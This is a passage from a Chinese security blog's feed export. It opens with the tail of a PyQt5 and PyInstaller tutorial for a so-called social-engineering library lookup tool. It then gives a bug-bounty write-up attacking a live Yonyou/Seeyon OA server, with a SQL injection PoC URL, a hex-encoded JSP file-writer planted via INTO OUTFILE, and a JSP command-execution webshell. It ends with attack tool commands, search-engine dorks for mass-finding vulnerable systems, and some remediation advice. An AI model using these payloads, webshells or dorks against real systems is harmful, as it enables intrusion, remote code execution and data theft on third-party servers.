shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Traceback (most recent call last):<br>  File &quot;e:\Social_Work_Library\src\search.py&quot;, line 126, in handle_search<br>    results = self.search(self.search_box.text())<br>              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^<br>TypeError: MainWindow.search() takes 1 positional argument but 2 were given<br></code></pre></td></tr></table></figure><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-03-10.png"></p><p>添加一个<code>self</code>参数即可修复：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">self,search_string</span>):<br>       <span class="hljs-comment"># 处理未选择文件的情况</span><br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data_frame) == <span class="hljs-number">0</span>:<br></code></pre></td></tr></table></figure><p>一个可以复用的文件选择控件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 控件定义</span><br>    self.file_button = QPushButton(<span class="hljs-string">&quot;选择文件&quot;</span>)<br>        self.file_button.clicked.connect(self.select_file)<br>        self.file_button.setStyleSheet(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            QPushButton &#123;</span><br><span class="hljs-string">                background-color: #4CAF50;</span><br><span class="hljs-string">                color: white;</span><br><span class="hljs-string">                border: none;</span><br><span class="hljs-string">                border-radius: 5px;</span><br><span class="hljs-string">                padding: 10px 20px;</span><br><span class="hljs-string">                font-family: SimSun;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">            QPushButton:hover &#123;</span><br><span class="hljs-string">                background-color: #45a049;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">            QPushButton:pressed &#123;</span><br><span class="hljs-string">                background-color: #398037;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span>)<br>        layout.addWidget(self.file_button)<br><span class="hljs-comment"># 文件选择函数</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_file</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            file_dialog = QFileDialog()<br>            file_dialog.setFileMode(QFileDialog.ExistingFile)  <span class="hljs-comment"># 设置为选择现有文件</span><br>            file_dialog.setNameFilters([<span class="hljs-string">&quot;表格 (*.xlsx)&quot;</span>])  <span class="hljs-comment"># 设置文件过滤器</span><br>            file_dialog.exec_()<br>            file_paths = file_dialog.selectedFiles()<br>            file_path = file_paths[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> file_path:<br>                <span class="hljs-keyword">global</span> data_frame<br>                data_frame = pd.read_excel(file_path)<br>                success_dialog = QMessageBox()<br>                icon = QIcon(<span class="hljs-string">&quot;./src/success.ico&quot;</span>)<br>                success_dialog.setWindowIcon(icon)<br>                success_dialog.setWindowTitle(<span class="hljs-string">&quot;Success!!!&quot;</span>)<br>                success_dialog.setText(<span class="hljs-string">f&quot;文件路径是：<span class="hljs-subst">&#123;file_path&#125;</span>&quot;</span>)<br>                success_dialog.exec_()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            error_dialog = QMessageBox()<br>            icon = QIcon(<span class="hljs-string">&quot;./src/error.ico&quot;</span>)<br>            error_dialog.setWindowIcon(icon)<br>            error_dialog.setIcon(QMessageBox.Critical)<br>            error_dialog.setWindowTitle(<span class="hljs-string">&quot;Sad~~~&quot;</span>)<br>            error_dialog.setText(<span class="hljs-string">&quot;错误信息&quot;</span>)<br>            error_dialog.exec_()<br></code></pre></td></tr></table></figure><h4 id="将Python程序打包成一个最小的exe"><a href="#将Python程序打包成一个最小的exe" class="headerlink" title="将Python程序打包成一个最小的exe"></a>将Python程序打包成一个最小的exe</h4><p>之前直接用电脑自带的<code>Python</code>环境打包，直接打了我400多<code>MB</code>，就离谱</p><p>选择用<code>conda</code>重建一个虚拟的环境，仅仅使用我们需要的包和基础环境，这样打包下来会小很多</p><p>方法如下：</p><p>建立一个新的环境，并切换进去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">conda create -n virtual_exe python==3.8<br>conda activate virtual_exe<br>conda list<br></code></pre></td></tr></table></figure><p><code>conda</code>安装的虚拟环境，会把虚拟环境的目录生成在<code>anaconda</code>安装目录下的<code>env</code>目录下</p><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-39-53.png"></p><p>可以发现新建的环境非常清爽👍👍</p><p>下载我们所需要的包：<code>pyinstaller</code>，<code>pandas</code>，<code>PyQt5</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pandas<br> <br>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple PyQt5<br> <br>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyinstaller<br></code></pre></td></tr></table></figure><p>切换到我们源文件所在的目录，用<code>Pyinstaller</code>打包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Pyinstaller -F -w -i title.ico search.py<br></code></pre></td></tr></table></figure><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-15-50.png"></p><p>打包成功：</p><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-19-13.png"></p><p>在当前目录的<code>dist</code>目录下：</p><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-19-53.png"></p><p>双击正常运行：😘</p><p><img src="/2023/09/05/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAxx%E5%BA%93%E6%9F%A5%E8%AF%A2demo/Snipaste_2023-09-06_15-21-16.png"></p><p>——————————————————————————————————————————</p><p>最后附上<a href="https://github.com/REMIXXYH/Social_Work_lib_EXE">项目地址</a>😐</p>]]></content>
    
    
    <categories>
      
      <category>工具编写</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具编写</tag>
      
      <tag>社工库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次公益SRC挖掘-230903</title>
    <link href="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/"/>
    <url>/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/</url>
    
    <content type="html"><![CDATA[<p>记一次由SQL注入到RCE😎</p><span id="more"></span><h3 id="fofa寻找到目标"><a href="#fofa寻找到目标" class="headerlink" title="fofa寻找到目标"></a>fofa寻找到目标</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">header</span>=<span class="hljs-string">&quot;/yyoa&quot;</span>&amp;&amp;body!=<span class="hljs-string">&quot;您使用的浏览器不适合本系统运行要求&quot;</span><br></code></pre></td></tr></table></figure><p>寻找到致远用友OA的站点</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-41-48.png"></p><p>寻找到一大堆，随便找一个访问啦</p><h3 id="发现存在Nday——SQL注入"><a href="#发现存在Nday——SQL注入" class="headerlink" title="发现存在Nday——SQL注入"></a>发现存在Nday——SQL注入</h3><p>首先访问到登陆页面啦:<a href="http://xxx.xxx.xxx.xxx:8001/yyoa/index.jsp">http://xxx.xxx.xxx.xxx:8001/yyoa/index.jsp</a></p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-45-31.png"></p><p>直接上工具扫：</p><p>发现存在SQL注入Nday，那就不废话了，直接打POC：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://x.x.x.x:8001/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)<br></code></pre></td></tr></table></figure><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_15-47-12.png"></p><p>出现回显，SQL注入，直接一个妥妥的高危了</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_11-43-50.png"></p><h3 id="上传webshell拿到RCE"><a href="#上传webshell拿到RCE" class="headerlink" title="上传webshell拿到RCE"></a>上传webshell拿到RCE</h3><p>但是仅仅这样感觉太容易了，根路径都出来了，想拿个<code>webshell</code>试试，于是进行操作：</p><p>首先我们不妨猜测一下网页路径：<code>Google</code>一下得到大概应该是这样的：<code>D:/UFseeyon_2020/OA/tomcat/webapps/yyoa/</code></p><p>然后得验证一下：</p><p>使用<code>mysql</code>里自带的<code>load_file</code>函数验证一下：<code>/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20load_file(%27D:/UFseeyon_2020/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27)</code></p><p>确实存在哈，lucky😊</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-13-52.png"></p><p>查阅了一下知识库，需要分两步走：</p><p>利用<code>mysql into outfile</code>写<code>shell</code>：由于<code>jsp</code>一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造上传页面进行<code>RCE</code>脚本的上传</p><h4 id="上传写文件脚本"><a href="#上传写文件脚本" class="headerlink" title="上传写文件脚本"></a>上传写文件脚本</h4><p>脚本内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;f&quot;</span>)!=<span class="hljs-literal">null</span>)(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileOutputStream(application.getRealPath(<span class="hljs-string">&quot;&quot;</span>)+request.getParameter(<span class="hljs-string">&quot;f&quot;</span>))).write(request.getParameter(<span class="hljs-string">&quot;t&quot;</span>).getBytes());%&gt;<br></code></pre></td></tr></table></figure><p>通过一个<code>f</code>参数上传脚本</p><p>由于特殊符号存在，URL编码会造成写入后代码错误，故采用<code>hex</code>编码后<code>unhex</code>函数处理上传，写入文件名为：<code>he1p.jsp</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27D:/UFseeyon_2020/OA/tomcat/webapps/yyoa/he1p.jsp%27<br></code></pre></td></tr></table></figure><p>上传成功👍</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_11-42-50.png"></p><h4 id="构造本地html上传RCE脚本"><a href="#构造本地html上传RCE脚本" class="headerlink" title="构造本地html上传RCE脚本"></a>构造本地html上传RCE脚本</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://x.x.x.x/yyoa/he1p.jsp?f=he11o.jsp&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">t</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">120</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">10</span> <span class="hljs-attr">width</span>=<span class="hljs-string">45</span>&gt;</span>your code<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传<code>RCE</code>脚本，这里尝试了蚁剑马和冰蝎马都连不上，最后选择了RCE这种方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;b&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;i&quot;</span>)).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-23-46.png"></p><p>上传后在浏览器里输入：<code>http://x.x.x.x:8001/yyoa/he11o.jsp?pwd=b&amp;i=whoami</code>，即可执行系统命令</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-25-59.png"></p><p>一个妥妥的高危到手👍👍👍</p><p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-08_21-27-16.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SRC冲榜宝典</title>
    <link href="/2023/09/03/SRC%E5%86%B2%E6%A6%9C%E5%AE%9D%E5%85%B8/"/>
    <url>/2023/09/03/SRC%E5%86%B2%E6%A6%9C%E5%AE%9D%E5%85%B8/</url>
    
    <content type="html"><![CDATA[<p>记录一些自己刷洞的经验啦😊😊😊</p><span id="more"></span><h3 id="盒子公益SRC的一些说明"><a href="#盒子公益SRC的一些说明" class="headerlink" title="盒子公益SRC的一些说明"></a>盒子公益SRC的一些说明</h3><h4 id="审核"><a href="#审核" class="headerlink" title="审核"></a>审核</h4><p>通常需要1-10天的时间等待厂商认领及处理。<br>也就是说一个漏洞 审核期间+漏洞确认期间，大概10天左右</p><p>上分最好的时间点：<strong>上个月的25-28号-当月的20号</strong></p><p>20号以后：可以把漏洞都攒起来 到25-28号左右一块提交，然后下个月的排行榜上绝对有你的名字</p><h3 id="常用工具命令"><a href="#常用工具命令" class="headerlink" title="常用工具命令"></a>常用工具命令</h3><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -r &quot;./test2.txt&quot; --threads=10 --tamper=between --time-sec=2 --dbms=mysql --union-char=a --random-agent<br></code></pre></td></tr></table></figure><h4 id="xssStrike"><a href="#xssStrike" class="headerlink" title="xssStrike"></a>xssStrike</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python xsstrike.py -u XXX --crawl -l 4 --skip-dom<br></code></pre></td></tr></table></figure><h3 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h3><h4 id="弱口令修复建议："><a href="#弱口令修复建议：" class="headerlink" title="弱口令修复建议："></a>弱口令修复建议：</h4><p>（1）使用多种字符组合的强密码，如大小写字母+数字+特殊字符；<br>（2）用户密码中不要出现与用户名或者系统名相关的字符，如用户名@123、系统名123等；<br>（3）不要使用系统默认初始密码；或设定在系统首次登录时，强制修改系统默认初始密码；<br>（4）应避免部门或单位对成员设置相同密码；<br>（5）对系统中密码的存储进行加密处理，避免密码明文存储；<br>（6）增强用户安全意识，定期变更系统密码；<br>（7）应避免同一密码用于多个系统，避免由于信息泄露导致的安全风险连锁反应；</p><h4 id="Thiniphp日志泄露修复建议："><a href="#Thiniphp日志泄露修复建议：" class="headerlink" title="Thiniphp日志泄露修复建议："></a>Thiniphp日志泄露修复建议：</h4><p>1.升级Thinkphp版本<br>2.关闭Thinkphp的debug模式<br>3.控制访问路径权限或者隐藏日志路径</p><h4 id="未授权访问修复建议："><a href="#未授权访问修复建议：" class="headerlink" title="未授权访问修复建议："></a>未授权访问修复建议：</h4><p>加入用户身份认证机制或token验证，对系统的功能点增加权限控制。<br>&lt;1&gt; 采用Java过滤器技术，对&#x2F;pages下所有的URL进行登录状态检查，通过session.getAttribute（）方法从session中获取登录成功时存入的session中的身份标识，判断客户端传递过来的身份标识是否与session中保存的一致，不一致则跳转到登录页面，关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//从session里取的用户名信息</span><br><span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">&quot;userID&quot;</span>);<br><span class="hljs-comment">//getAttribute中变量根据实际变量传入。</span><br><span class="hljs-comment">//判断如果没有取到用户信息,就跳转到登陆页面</span><br><span class="hljs-keyword">if</span> ((username == <span class="hljs-literal">null</span>) || <span class="hljs-string">&quot;&quot;</span>.equals(username)) &#123;<br>    <span class="hljs-comment">//跳转到登陆页面</span><br>    res.sendRedirect(<span class="hljs-string">&quot;http://&quot;</span> + req.getHeader(<span class="hljs-string">&quot;Host&quot;</span>) +<span class="hljs-string">&quot;/login_oa.jsp&quot;</span>);<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//已经登陆,继续此次请求</span><br>    chain.doFilter(req, res); <br>&#125;<br></code></pre></td></tr></table></figure><p>&lt;2&gt; 进行权限判断，以下代码为过滤器程序，通过会话获取用户身份信息，进行权限判断等操作</p><p>&#x2F;&#x2F;在配置文件中设置过滤器SessionFilter com.nsfocus.frame.filter.SessionFilterSessionFilter&#x2F;pages</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>    <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> req.getSession(<span class="hljs-literal">true</span>);<br>    <span class="hljs-comment">//从session里取的用户名信息</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">&quot;userID&quot;</span>);<br>    <span class="hljs-comment">//getAttribute中变量根据实际变量传入。</span><br>    <span class="hljs-comment">//判断如果没有取到用户信息,就跳转到登陆页面 </span><br>    <span class="hljs-keyword">if</span> ((username == <span class="hljs-literal">null</span>) || <span class="hljs-string">&quot;&quot;</span>.equals(username)) &#123;<br>        <span class="hljs-comment">//跳转到登陆页面</span><br>        res.sendRedirect(<span class="hljs-string">&quot;http://&quot;</span> + req.getHeader(<span class="hljs-string">&quot;Host&quot;</span>) +<span class="hljs-string">&quot;/login_oa.jsp&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//已经登陆,继续此次请求</span><br>        chain.doFilter(req, res); <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>。</p><h4 id="SQL注入修复建议："><a href="#SQL注入修复建议：" class="headerlink" title="SQL注入修复建议："></a>SQL注入修复建议：</h4><p>（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。<br>（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。<br>（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。<br>（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。<br>（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。<br>（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。<br>（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。<br>（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p><h3 id="GoogleHacking快速寻找脆弱系统："><a href="#GoogleHacking快速寻找脆弱系统：" class="headerlink" title="GoogleHacking快速寻找脆弱系统："></a>GoogleHacking快速寻找脆弱系统：</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">intext:后台登录  inurl:login.php -canvas -十合一全网营销方案<br>intext:管理员登录  inurl:login.php -canvas -十合一全网营销方案 -U盾<br>intext:后台登录  inurl:login.asp -焦点网络 -Administrator Login<br>intext:管理员登录  inurl:login.asp -焦点网络 -Administrator Login<br></code></pre></td></tr></table></figure><h3 id="fofa快速寻找脆弱系统"><a href="#fofa快速寻找脆弱系统" class="headerlink" title="fofa快速寻找脆弱系统:"></a>fofa快速寻找脆弱系统:</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">port=<span class="hljs-string">&quot;6379&quot;</span>&amp;&amp;city=<span class="hljs-string">&quot;Kunming&quot;</span>&amp;&amp;protocol=<span class="hljs-string">&quot;redis&quot;</span><br>title=<span class="hljs-string">&quot;tomcat&quot;</span>&amp;&amp;server==<span class="hljs-string">&quot;Apache&quot;</span>&amp;&amp;status_code=<span class="hljs-string">&quot;200&quot;</span>&amp;&amp;country=<span class="hljs-string">&quot;CN&quot;</span><br>header=<span class="hljs-string">&quot;thinkphp&quot;</span>&amp;&amp;country=<span class="hljs-string">&quot;CN&quot;</span>&amp;&amp;title=<span class="hljs-string">&quot;后台管理&quot;</span><br>header=<span class="hljs-string">&quot;thinkphp&quot;</span>&amp;&amp;country=<span class="hljs-string">&quot;CN&quot;</span>&amp;&amp;title=<span class="hljs-string">&quot;后台管理&quot;</span>&amp;&amp;after=<span class="hljs-string">&quot;2021-01-01&quot;</span><br>header=<span class="hljs-string">&quot;/yyoa&quot;</span>&amp;&amp;body!=<span class="hljs-string">&quot;您使用的浏览器不适合本系统运行要求&quot;</span>&amp;&amp;country=<span class="hljs-string">&quot;CN&quot;</span><br>(icon_hash=<span class="hljs-string">&quot;-1231872293&quot;</span> || icon_hash=<span class="hljs-string">&quot;706913071&quot;</span>)&amp;&amp;org=<span class="hljs-string">&quot;China Education and Research Network Center&quot;</span> <span class="hljs-comment">#ruoyi</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次eduSRC挖掘-230827</title>
    <link href="/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/"/>
    <url>/2023/08/31/%E4%B8%80%E6%AC%A1eduSRC%E6%8C%96%E6%8E%98-230827/</url>
    
